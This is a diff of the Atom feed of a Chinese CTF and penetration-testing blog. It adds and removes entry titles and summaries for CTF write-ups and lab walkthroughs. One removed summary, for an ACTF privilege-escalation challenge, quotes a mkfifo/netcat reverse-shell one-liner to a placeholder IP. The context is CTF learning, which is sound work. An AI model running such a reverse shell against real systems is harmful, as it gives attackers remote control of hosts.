@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://guokeya.github.io</id>
     <title>过客</title>
-    <updated>2020-06-19T02:47:04.519Z</updated>
+    <updated>2020-06-20T09:01:19.013Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://guokeya.github.io"/>
     <link rel="self" href="https://guokeya.github.io/atom.xml"/>
@@ -10,6 +10,13 @@
     <logo>https://guokeya.github.io/images/avatar.png</logo>
     <icon>https://guokeya.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 过客</rights>
+    <entry>
+        <title type="html"><![CDATA[[RoarCTF 2019]PHPShe(注入+phar反序列化)]]></title>
+        <id>https://guokeya.github.io/post/zE_m1kHQm/</id>
+        <link href="https://guokeya.github.io/post/zE_m1kHQm/">
+        </link>
+        <updated>2020-06-20T08:05:22.000Z</updated>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Connect-The-Dots 靶机渗透]]></title>
         <id>https://guokeya.github.io/post/mT80JFOVo/</id>
@@ -23,6 +30,13 @@
         <link href="https://guokeya.github.io/post/9REuNTopQ/">
         </link>
         <updated>2020-06-16T12:22:34.000Z</updated>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域渗透常用命令]]></title>
+        <id>https://guokeya.github.io/post/tFK-eJTet/</id>
+        <link href="https://guokeya.github.io/post/tFK-eJTet/">
+        </link>
+        <updated>2020-06-16T06:18:31.000Z</updated>
     </entry>
     <entry>
         <title type="html"><![CDATA[Dozer域渗透]]></title>
@@ -73,33 +87,5 @@
         <link href="https://guokeya.github.io/post/WqbFrLx89/">
         </link>
         <updated>2020-06-10T07:39:54.000Z</updated>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[ACTF up up(提权)]]></title>
-        <id>https://guokeya.github.io/post/6IpnTQdmW/</id>
-        <link href="https://guokeya.github.io/post/6IpnTQdmW/">
-        </link>
-        <updated>2020-06-09T14:50:54.000Z</updated>
-        <summary type="html"><![CDATA[<p>www.zip下载得到一个一句话的后门<br>
-连接上去。</p>
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP port &gt;/tmp/f
-</code></pre>
-]]></summary>
-        <content type="html"><![CDATA[<p>www.zip下载得到一个一句话的后门<br>
-连接上去。</p>
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IP port &gt;/tmp/f
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[Zer0pts2020]musicblog(绕过CSP。进行请求)]]></title>
-        <id>https://guokeya.github.io/post/rFsNvBC3x/</id>
-        <link href="https://guokeya.github.io/post/rFsNvBC3x/">
-        </link>
-        <updated>2020-06-09T07:43:40.000Z</updated>
-        <summary type="html"><![CDATA[<p>我们输入的东西。管理员会给你点赞</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>我们输入的东西。管理员会给你点赞</p>
-]]></content>
     </entry>
 </feed>
